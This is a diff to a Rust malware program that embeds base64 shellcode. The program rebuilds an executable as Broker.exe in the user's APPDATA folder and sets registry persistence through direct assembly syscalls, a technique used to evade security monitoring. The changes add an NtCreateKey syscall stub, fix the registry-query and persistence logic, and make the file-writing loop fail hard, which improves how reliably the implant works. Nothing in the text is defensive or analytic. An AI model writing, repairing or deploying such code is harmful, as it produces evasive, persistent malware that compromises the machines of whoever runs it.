@@ -154,6 +154,12 @@ asm_nt_query_value_key:
     syscall
     ret
 
+.global asm_nt_create_key
+asm_nt_create_key:
+    mov r10, rcx
+    mov eax, [rsp + 0x40]
+    syscall
+    ret
 "#);
 
 extern "C" {
@@ -170,9 +176,11 @@ extern "C" {
     fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_query_information_file(FileHandle: HANDLE, IoStatusBlock: *mut IO_STATUS_BLOCK, FileInformation: *mut std::ffi::c_void, Length: u32, FileInformationClass: u32, syscall_id: u32) -> NTSTATUS;
+    #[allow(dead_code)]
     fn asm_nt_open_key(KeyHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_set_value_key(KeyHandle: HANDLE, ValueName: *mut UNICODE_STRING, TitleIndex: u32, Type: u32, Data: *mut std::ffi::c_void, DataSize: u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_query_value_key(KeyHandle: HANDLE, ValueName: *mut UNICODE_STRING, KeyValueInformationClass: u32, KeyValueInformation: *mut std::ffi::c_void, Length: u32, ResultLength: &mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_create_key(KeyHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, TitleIndex: u32, Class: *mut UNICODE_STRING, CreateOptions: u32, Disposition: *mut u32, syscall_id: u32) -> NTSTATUS;
 }
 
 const SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";
@@ -400,7 +408,7 @@ fn reconstruct_exe(dest_path: &str) -> Option<()> {
                 nt_create_file_syscall,
             )
         };
-        if status != 0 { continue; }
+        if status != 0 { return None; }
 
         let mut fsi = FILE_STANDARD_INFO {
             AllocationSize: 0,
@@ -530,7 +538,8 @@ fn set_persistence(exe_path: &str) -> Option<()> {
     let mut key_path_u16: Vec<u16> = key_path.encode_utf16().collect();
     key_path_u16.push(0);
 
-    let nt_open_key_syscall = syscall::get_syscall_number("NtOpenKey")?;
+    let _nt_open_key_syscall = syscall::get_syscall_number("NtOpenKey")?;
+    let nt_create_key_syscall = syscall::get_syscall_number("NtCreateKey")?;
     let nt_query_value_key_syscall = syscall::get_syscall_number("NtQueryValueKey")?;
     let nt_set_value_key_syscall = syscall::get_syscall_number("NtSetValueKey")?;
     let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
@@ -551,12 +560,17 @@ fn set_persistence(exe_path: &str) -> Option<()> {
         SecurityQualityOfService: std::ptr::null_mut(),
     };
 
+    let mut disposition = 0u32;
     let status = unsafe {
-        asm_nt_open_key(
+        asm_nt_create_key(
             &mut key_handle,
             0x00020000 | 0x0001 | 0x0002, // KEY_READ | KEY_WRITE
             &mut attr,
-            nt_open_key_syscall,
+            0,
+            std::ptr::null_mut(),
+            0,
+            &mut disposition,
+            nt_create_key_syscall,
         )
     };
     if status != 0 { return None; }
@@ -576,7 +590,7 @@ fn set_persistence(exe_path: &str) -> Option<()> {
         asm_nt_query_value_key(
             key_handle,
             &mut value_name,
-            0, // KeyValuePartialInformation
+            2, // KeyValuePartialInformation
             buffer.as_mut_ptr() as *mut _,
             1024,
             &mut result_len,
@@ -648,7 +662,7 @@ fn get_process_pid() -> Option<u32> {
 
 fn main() {
     let app_data = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\".to_string());
-    let dest_path = format!("{}\\Microsoft\\Windows\\Broker.exe", app_data);
+    let dest_path = format!("{}\\Broker.exe", app_data);
 
     if let Some(_) = reconstruct_exe(&dest_path) {
         set_persistence(&dest_path);
